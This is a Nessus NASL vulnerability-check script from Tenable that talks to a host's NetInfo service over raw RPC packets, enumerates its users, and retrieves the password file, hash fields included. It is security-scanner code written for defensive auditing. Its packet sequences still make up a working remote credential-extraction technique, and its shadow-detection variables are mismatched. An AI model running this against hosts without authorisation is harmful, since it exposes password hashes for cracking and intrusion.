#
# This script is (C) Tenable Network Security
#

if(description)
{
 script_id(11898);
 script_bugtraq_id(2953);
 script_version("$Revision: 1.8 $");
 
 name["english"] = "Obtain /etc/passwd using NetInfo";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
This script attempts to read the password file of the remote
host by using NetInfo.";


 script_description(english:desc["english"]);
 
 summary["english"] = "Uses NetInfo to read /etc/passwd remotely";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "General";
 script_family(english:family["english"]);
 script_dependencies("rpc_portmap.nasl", "netinfo_detect.nasl");
 exit(0);
}

function get_rpc_port(protocol)
{ 
 local_var	broken, req, soc, r, port;
 local_var	a, b, c, d, p_a, p_b, p_c, p_d, pt_a, pt_b, pt_c, pt_d;

 
 
 a = rand() % 255;
 b = rand() % 255;
 c = rand() % 255;
 d = rand() % 255;
 
 p_a = program / 16777216; 	p_a = p_a % 256;
 p_b = program / 65356; 	p_b = p_b % 256;
 p_c = program / 256;   	p_c = p_c % 256;
 p_d = program % 256;

 pt_a = protocol / 16777216; pt_a = pt_a % 256;
 pt_b = protocol / 65535   ; pt_b = pt_b % 256;
 pt_c = protocol / 256;    ; pt_c = pt_c % 256;
 pt_d = protocol % 256;
 
 
 req = raw_string(a, 	b, 	c, 	d, 	# XID
 		  0x00, 0x00, 0x00, 0x00,	# Msg type: call
		  0x00, 0x00, 0x00, 0x02,	# RPC Version
		  0x00, 0x01, 0x86, 0xA0,	# Program
		  0x00, 0x00, 0x00, 0x02,	# Program version
		  0x00, 0x00, 0x00, 0x03,	# Procedure
		  0x00, 0x00, 0x00, 0x00,	# Credentials - flavor
		  0x00, 0x00, 0x00, 0x00, 	# Credentials - length
		  0x00, 0x00, 0x00, 0x00,	# Verifier - Flavor
		  0x00, 0x00, 0x00, 0x00,	# Verifier - Length
		  
		  0x0b, 0xed, 0x48, 0xa1,	# Program
		  0xFF, 0xFF, 0xFF, 0xFF,	# Version (any)
		  pt_a, pt_b, pt_c, pt_d,	# Proto (udp)
		  0x00, 0x00, 0x00, 0x00	# Port
 		  );
	
	  
  port = int(get_kb_item("rpc/portmap"));
  if(port == 0)port = 111;
 	  
	  
 broken = get_kb_item(string("/tmp/rpc/noportmap/", port));
 if(broken)return(0);
 
 	  
 soc = open_sock_udp(port);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1024);
 
 close(soc);
 if(!r)
 {
  set_kb_item(name:string("/tmp/rpc/noportmap/", port), value:TRUE);
  return(0);
 }
 
 if(strlen(r) < 28)
  return(0);
 else
  {
   p_d = ord(r[27]);
   p_c = ord(r[26]);
   p_b = ord(r[25]);
   p_a = ord(r[24]);
   port = p_a;
   port = port * 256;
   port = port +p_b; 
   port = port * 256;
   port = port + p_c; 
   port = port * 256;
   port = port + p_d;
   return(port);
  }
}





function netinfo_recv(socket)
{
 local_var buf, len;

 buf = recv(socket:soc, length:4);
 if(strlen(buf) < 4)return NULL;

 len = ord(buf[3]) + ord(buf[2])*256;

 buf += recv(socket:soc, length:len);
 return buf;
}


function decode_strings(reply)
{
 local_var len, pad, start;
 local_var ret, str, value;

 ret = make_list();
 start = 46;
  
 while ( TRUE )
 {
 if(start > strlen(reply))break;
 len = ord(reply[start]) * 256 + ord(reply[start+1]);
 start += 2;
 str = substr(reply, start, start + len - 1);
 if( strlen(str) % 4 ) pad = 4 - strlen(str) % 4;
 else pad = 0;
 start += len + 6 + pad;
 len = ord(reply[start]) * 256 + ord(reply[start+1]);
 start += 2;
 value = substr(reply, start, start + len - 1);
 if( strlen(value) % 4 ) pad = 4 - strlen(value) % 4;
 else pad = 0;
 start += len + 2 + pad;
 ret[str] = value;
 }
 return ret;
 
}


report = "";
passwdless = "";


rpcport = get_rpc_port(protocol:IPPROTO_TCP);
if ( rpcport && get_port_state(rpcport))
{
 soc = open_sock_tcp(rpcport);
 if (  soc ) 
 {
  req = raw_string(0x80, 0x00, 0x00, 0x28, 0x11, 0xe0, 0x40, 0x95,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		 0x0b, 0xed, 0x48, 0xa1, 0x00, 0x00, 0x00, 0x01,
		 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00);

 send(socket:soc, data:req);
 r = netinfo_recv(socket:soc);
 close(soc);
 if(strlen(r) > 35)
 {
  num_domains = ord(r[35]);
  start = 38;
  for ( i = 0 ; i < num_domains ; i ++ )
   {
   if(start > strlen(r))break;
   len = ord(r[start]) * 256 + ord(r[start+1]);
   start += 2;
   domain[i] = substr(r, start, start + len - 1);
   start += len + 10;
   if(len % 4)start += 4 - (len % 4);
   }
  }
 }
}

rpcport = get_rpc_port(protocol:IPPROTO_UDP);
flag = 0;
if ( rpcport )
{
 for ( n = 0 ; n < num_domains ; n ++ )
 {
 soc = open_sock_udp(rpcport);
 l_lo = strlen(domain[n]) % 256;
 l_hi = strlen(domain[n]) / 256;
 r = raw_string(0x68, 0xc1, 0x58, 0x98, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x02, 0x0b, 0xed, 0x48, 0xa1,
		0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, l_hi, l_lo) + domain[n];
 if(strlen(domain[n]) % 4)r += crap(data:raw_string(0), length:4-(strlen(domain[n]) % 4));
 send(socket:soc, data:r);
 r = recv(socket:soc, length:4096);
 close(soc);
 if ( !r ) break;
 else flag = 1;

 port = ord(r[strlen(r) - 2]) * 256 + ord(r[strlen(r) - 1]);
 domain_port[domain[n]] = port;
 }
}

#
# If we can not connect to nibindd, then we brute force
# our way by connecting to every port on which we KNOW that
# netinfo is listening.
#
if ( ! flag )
{
 ports = get_kb_list("Services/netinfo");
 if(isnull(ports))exit(0);
 else ports = make_list(ports);
 foreach p (ports)
 {
  domain_port["unknown_on_port_" + string(p)] = p;
 }
}

foreach dom (keys(domain_port))
{
 port = domain_port[dom];
 if ( get_port_state(port) )
 {
 soc = open_sock_tcp(port);
 if( soc ) 
 {
 req = raw_string(0x80, 0x00, 0x00, 0x28, 0x15, 0xeb, 0x49, 0x80,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		 0x0b, 0xed, 0x48, 0xa0, 0x00, 0x00, 0x00, 0x02,
		 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00);

send(socket:soc, data:req);
r = netinfo_recv(socket:soc);



req = raw_string(0x80, 0x00, 0x00, 0x28, 0x15, 0xeb, 0x49, 0x7f,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		 0x0b, 0xed, 0x48, 0xa0, 0x00, 0x00, 0x00, 0x02,
		 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00);

send(socket:soc, data:req);
r = netinfo_recv(socket:soc);



#
# Request the users map
# 

req = raw_string(0x80, 0x00, 0x00, 0x44, 0x15, 0xeb, 0x49, 0x7e,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		 0x0b, 0xed, 0x48, 0xa0, 0x00, 0x00, 0x00, 0x02,
		 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00,
	 	 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x04,
	         0x6e, 0x61, 0x6d, 0x65, 0x00, 0x00, 0x00, 0x05,
		 0x75, 0x73, 0x65, 0x72, 0x73, 0x00, 0x00, 0x00);

send(socket:soc, data:req);
r = netinfo_recv(socket:soc);

if ( r )
{
req = raw_string(0x80, 0x00, 0x00, 0x30, 0x15, 0xeb, 0x49, 0x7d,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		 0x0b, 0xed, 0x48, 0xa0, 0x00, 0x00, 0x00, 0x02,
		 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
		 0x00, 0x00, 0x00, ord(r[strlen(r) - 1]));

send(socket:soc, data:req);
r = netinfo_recv(socket:soc);
}

if ( r )
{
req = raw_string(0x80, 0x00, 0x00, 0x30, 0x15, 0xeb, 0x49, 0x7c,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		 0x0b, 0xed, 0x48, 0xa0, 0x00, 0x00, 0x00, 0x02,
		 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
		 0x00, 0x00, 0x00, ord(r[strlen(r) - 1]));


send(socket:soc, data:req);
r = netinfo_recv(socket:soc);
}

if(strlen(r) > 35)
 {
num_users = ord(r[35]);


j = 0;
for(i=0;i<num_users*4;i+=4)
{
 if(40 + i > strlen(r))break;
 users[j] = substr(r, 36 + i, 39 + i);
 j++;
}

users[j] = NULL;

for ( i = 0 ; i < num_users ; i ++ )
{
 req = raw_string(0x80, 0x00, 0x00, 0x30, 0x15, 0xeb, 0x49, 0x7b,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		  0x0b, 0xed, 0x48, 0xa0, 0x00, 0x00, 0x00, 0x02,
		  0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00) + users[i] + raw_string(
		  0x00, 0x00, 0x00, 0x0c);
 send(socket:soc, data:req);
 r = netinfo_recv(socket:soc);
 user = decode_strings(reply:r);
 if(user["name"] && user["uid"])
 {
 if ( flag == 0 )
 {
 report += ". In domain '" + dom + "' :

";
 flag = 1;
 }
  
 report += string(user["name"], ":", user["passwd"], ":", user["uid"], ":", user["gid"], ":", user["realname"], ":", user["home"], ":", user["shell"], "\n");
 if(strlen(user["passwd"]) == 0 )
  {
  passwdless += '  . ' + user["name"] + '\n';
  }
 if ( ! ereg(pattern:"^\**", string:user["passwd"]) )
	not_shadow ++;
 }
 }
 }
 }
}
 flag = 0;

}



if(strlen(report))
{
 report = "
Using NetInfo, it was possible to obtain the password file of the remote host
by querying it directly. The content of this file is :

" + report;


if ( no_shadow ) report += "

An attacker may use it to set up a brute force attack to crack the 
passwords contained in the file, and then use the gained passwords to
login into the remote host, either remotely or locally";
else report += "

An attacker may use it to set up a brute force attack against the
remote account names.";



if(strlen(passwdless)) 
{
 no_shadow++;
 report += "

Note that the following accounts have NO PASSWORD set :
" + passwdless;
	}

 if ( no_shadow )
  security_hole(port:port, data:report);
 else
  security_warning(port:port, data:report);

 }
